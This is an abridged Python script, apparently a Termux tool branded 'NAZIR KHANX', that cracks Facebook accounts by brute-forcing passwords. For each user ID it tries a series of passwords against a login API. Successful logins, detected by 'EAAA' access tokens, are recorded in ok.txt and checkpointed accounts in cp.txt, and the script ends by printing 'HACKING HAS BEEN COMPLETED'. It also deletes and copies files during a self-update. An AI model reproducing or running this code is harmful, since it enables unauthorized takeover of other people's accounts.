...
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n'########::'#######::'########::\n... ##..::'##.... ##: ##.... ##:\n::: ##:::: ##:::: ##: ##:::: ##:\n::: ##:::: ##:::: ##: ########::\n::: ##:::: ##:::: ##: ##.. ##:::\n::: ##:::: ##:::: ##: ##::. ##::\n::: ##::::. #######:: ##:::. ##:\n:::..::::::.......:::..:::::..::\n  ╔═════════════════════════════╗\n    ║ TOOL NAME: {NAZIR KHANX}        ║\n    ║ AUTHOR   : 🔥 TOOR AJMAL XE NAZIR🔥       ║\n    ║ GITHUB   : git.io/NaZirKHaN43   ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	
...
def log_sel():
	...
	if sel == "":
		...
		subprocess.check_output(["am", "start", " https://www.facebook.com/NaZerkhaN521"])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system(" https://www.facebook.com/NaZerkhaN521")
			os.system("rm -rf fcpro.py")
			os.system("cp -f fcpro/fcpro.py \\.")
			os.system("rm -rf fcpro")
			xox("\033[92;1m\n NAZIR TOOLS UPDATE SUCCESSFUL :)\n")
			time.sleep(2)
			main()
...
def menu():
    ...
    logo()
    print("")
    print("\033[93;1m     NAZIR KHANX : \033[92;1m"+xn)
...
def crack_select1():
	...
	if select =="1":
		...
		logo()
		print("")
		print("\t\033[92;1m NAZIR KHANX PUBLIC ID COINING ")
		print("")
		try:
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[TOOR-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
							...
							if "access_token" in data.text and "EAAA" in data.text:
								...
								if "www.facebook.com" in data.json()['error_msg']:
									...
									if "access_token" in data.text and "EAAA" in data.text:
										...
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[NAZIRCP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											...
											if "access_token" in data.text and "EAAA" in data.text:
												...
												if "www.facebook.com" in data.json()['error_msg']:
													...
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[TOOR-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														...
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[NAZIR-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															...
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[TOOR-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																...
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[NAZIR-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	...
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[TOOR-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		...
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[NAZIR-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
	...
	linex()
	print("")
	print("\033[92;1m NAZIR KHANX HACKING HAS BEEN COMPLETED")
...
def crack_select():
	...
	linex()
	print("")
	print("\033[92;1m NAZIR KHAN HACKING HAS BEEN COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
